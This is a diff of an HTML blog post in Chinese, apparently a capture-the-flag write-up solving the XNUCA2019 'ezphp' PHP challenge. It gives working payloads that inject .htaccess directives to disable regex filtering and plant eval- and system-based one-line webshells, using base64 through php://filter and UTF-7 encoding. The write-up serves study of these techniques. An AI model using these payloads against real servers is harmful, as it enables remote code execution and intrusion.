@@ -368,45 +368,45 @@ file_put_contents($_GET[&#39;filename&#39;], $_GET[&#39;content&#39;]);</code></
 <pre><code>?filename=.htaccess&amp;content=php_value%20auto_append_file%201.a</code></pre>
 <p>分析<code>index.php</code>可以很好理解其程序执行时删掉了之前写入的<code>.htaccess</code>，此时<code>.htaccess</code>为通过参数写入的文件，其内容为php文件尾部包含<code>1.a</code>；根据这种猜测，执行<code>index.php</code>后界面显示应该为<code>hacker</code></p>
 <p><strong>👇接下来就是进行测试判断与猜想是否吻合</strong></p>
-<p>![截屏2020-08-23 下午8.12.21](学习XNUCA2019-ezphp/截屏2020-08-23 下午8.12.21.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-23%20%E4%B8%8B%E5%8D%888.12.21.png" alt="截屏2020-08-23 下午8.12.21"></p>
 <p>神奇的事情发生了，第一次的<code>.htaccess</code>文件明明删除了，但最后还是还是执行了其中的内容；</p>
 <p><strong>再次访问<code>index.php</code></strong></p>
-<p>![截屏2020-08-23 下午8.18.25](学习XNUCA2019-ezphp/截屏2020-08-23 下午8.18.25.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-23%20%E4%B8%8B%E5%8D%888.18.25.png" alt="截屏2020-08-23 下午8.18.25"></p>
 <p>此时是直接访问的<code>index.php</code>，<code>.htaccess</code>已经被删除，但最后还是包含了<code>1.a</code>中的内容</p>
 <p>由此不难得出，程序在运行时是先将<code>.htaccess</code>读入内存，在当前<strong>程序执行时</strong>如果文件被删除并不影响<code>.htaccess</code>对配置的修改；<strong>但注意是在程序执行时才是如此</strong>；如果直接删除<code>.htaccess</code>很显然对配置的修改自然就会失效</p>
 <p><strong>了解了运作机制以及之前几篇关于Apache文章的知识积累接下来就是轻松的解题环节，对于以下题解的疑问都可以在之前得文章中找到解释</strong></p>
 <h1 id="解题一"><a href="#解题一" class="headerlink" title="解题一"></a>解题一</h1><p>根据之前所写<a href="https://0xgeekcat.github.io/2020/08/16/%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/">文章</a>，可以通过修改<code>Apache</code>配置使得<code>preg_match</code>失效</p>
 <p>👇构造payload，结尾要用<code>\</code>处理content中的<code>\n</code>，不然违背<code>.htaccess</code>书写格式会导致<code>Apache</code>运行崩溃</p>
 <pre><code>?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;filename=.htaccess</code></pre>
-<p>![截屏2020-08-23 下午11.21.03](学习XNUCA2019-ezphp/截屏2020-08-23 下午11.21.03.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-23%20%E4%B8%8B%E5%8D%8811.21.03.png" alt="截屏2020-08-23 下午11.21.03"></p>
 <p>没有<code>preg_match</code>的waf后就可以通过<code>php://filter</code>伪协议写入一句话</p>
-<p>![截屏2020-08-23 下午11.14.43](学习XNUCA2019-ezphp/截屏2020-08-23 下午11.14.43.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-23%20%E4%B8%8B%E5%8D%8811.14.43.png" alt="截屏2020-08-23 下午11.14.43"></p>
 <pre><code>cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3BocCBldmFsKCRfR0VUWzFdKTs/Plw= 👈 注意这个=</code></pre>
 <p>‼️<strong>这里有个重要的注意事项</strong></p>
 <p>由于<code>$content</code>的结尾还有<code>&quot;\nJust one chance&quot;</code>污染字符串，所以需要被<code>base64</code>解码的整体字符串👇</p>
 <pre><code>cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3BocCBldmFsKCRfR0VUWzFdKTs/Plw=\nJust one chance</code></pre>
 <p>这就要注意到<code>=</code>在<code>base64</code>中是用于作为后缀起到填充作用的，但很明显这个字符串中<code>=</code>并不位于结尾，所以通过<code>php://filter</code>进行解码会报错</p>
 <p>👇一个简单的测试，此时<code>tmp.php</code>文件为空</p>
-<p>![截屏2020-08-24 上午10.05.34](学习XNUCA2019-ezphp/截屏2020-08-24 上午10.05.34.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8810.05.34.png" alt="截屏2020-08-24 上午10.05.34"></p>
 <p>删除<code>==</code>，写入成功</p>
 <p>![截屏2020-08-24 上午10.07.39](学习XNUCA2019-ezphp/截屏2020-08-24 上午10.07.39.png)</p>
 <p>网上很多人对此题的处理都是通过加字符填充处理，但并没对其操作的原理进行了解；学习还是应该刨根问底</p>
 <p>不过在<code>base64_decode</code>中的字符串中间有<code>=</code>并不影响结果</p>
-<p>![截屏2020-08-24 上午10.11.49](学习XNUCA2019-ezphp/截屏2020-08-24 上午10.11.49.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8810.11.49.png" alt="截屏2020-08-24 上午10.11.49"></p>
 <p>有了这个基础再构造最终的<code>payload</code></p>
 <pre><code>?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;1=phpinfo(); 👈 此时已经删除=</code></pre>
-<p>![截屏2020-08-24 上午10.13.33](学习XNUCA2019-ezphp/截屏2020-08-24 上午10.13.33.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8810.13.33.png" alt="截屏2020-08-24 上午10.13.33"></p>
 <h1 id="解题二"><a href="#解题二" class="headerlink" title="解题二"></a>解题二</h1><p>利用之前学习的<a href="https://0xgeekcat.github.io/2020/08/16/%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8-htaccess%E7%9A%84bypass%E6%8A%80%E5%B7%A7/#%E5%85%B3%E9%94%AE%E5%AD%97%E6%A3%80%E6%B5%8B">绕过关键字检测</a>直接绕过对于<code>$content</code>的waf</p>
 <pre><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?php%20system(&#39;cat%20/fl[a]g&#39;);?&gt;\</code></pre>
-<p>![截屏2020-08-24 上午10.24.30](学习XNUCA2019-ezphp/截屏2020-08-24 上午10.24.30.png)</p>
-<p>![截屏2020-08-24 上午10.24.50](学习XNUCA2019-ezphp/截屏2020-08-24 上午10.24.50.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8810.24.30.png" alt="截屏2020-08-24 上午10.24.30"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8810.24.50.png" alt="截屏2020-08-24 上午10.24.50"></p>
 <p><strong>❗️构造的payload要连续访问两次；</strong>第一次为载入内存，第二次才是执行</p>
 <h1 id="解题三"><a href="#解题三" class="headerlink" title="解题三"></a>解题三</h1><p>这种解题方法才是官方的正解，还是很有水平的</p>
 <p>注意到源码包含不存在的文件<code>fl3g.php</code>，意图肯定是想让我们向其中写入一句话之后利用文件包含getshell；但直接写入后会发现题目环境不解析<code>/var/www/html</code>中除<code>index.php</code>以外的php文件</p>
-<p>![截屏2020-08-24 上午10.39.30](学习XNUCA2019-ezphp/截屏2020-08-24 上午10.39.30.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8810.39.30.png" alt="截屏2020-08-24 上午10.39.30"></p>
 <p>查阅<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">php.ini配置选项列表</a>了解符合条件的可用配置👇</p>
-<p>![截屏2020-08-24 上午11.47.59](学习XNUCA2019-ezphp/截屏2020-08-24 上午11.47.59.png)</p>
-<p>![截屏2020-08-24 上午11.52.57](学习XNUCA2019-ezphp/截屏2020-08-24 上午11.52.57.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8811.47.59.png" alt="截屏2020-08-24 上午11.47.59"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8A%E5%8D%8811.52.57.png" alt="截屏2020-08-24 上午11.52.57"></p>
 <p><strong>❗️注意事项：</strong>error_log写入的内容默认经过<code>htmlentities</code>；会对html标签进行转义；可以用之前学过的<code>UTF-7</code>编码绕过</p>
 <p>利用error_log写入报错信息到<code>/tmp/fl3g.php</code>，，报错通过<code>include_path</code>包含错误路径触发；再设置<code>include_path=/tmp</code>即可让index.php能够包含<code>fl3g.php</code></p>
 <p>👇编写payload写入<code>UFT-7</code>编码的一句话</p>
@@ -420,7 +420,7 @@ php_value zend.multibyte 1
 php_value zend.script_encoding &quot;UTF-7&quot;
 # \</code></pre>
 <pre><code>php_value+include_path+%22%2ftmp%22%0aphp_value+zend.multibyte+1%0aphp_value+zend.script_encoding+%22UTF-7%22%0a%23+%5c</code></pre>
-<p>![截屏2020-08-24 下午12.01.54](学习XNUCA2019-ezphp/截屏2020-08-24 下午12.01.54.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0XNUCA2019-ezphp/%E6%88%AA%E5%B1%8F2020-08-24%20%E4%B8%8B%E5%8D%8812.01.54.png" alt="截屏2020-08-24 下午12.01.54"></p>
 <h1 id="吐槽一下"><a href="#吐槽一下" class="headerlink" title="吐槽一下"></a>吐槽一下</h1><p>真的吐了；这阵子一直在打比赛和调试环境中度过，搞的这个博客从18号一直拖到24号；自己也是菜的真实，打题打的人都傻了</p>
 <p>这道题细节是真的多，就算明白方法，操作上也有可能一不小心产生失误</p>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://nikoeurus.github.io/2019/12/01/xnuca-Web/#ezphp" target="_blank" rel="noopener">从xnuca2019-ezphp深入学习.htaccess</a></p>
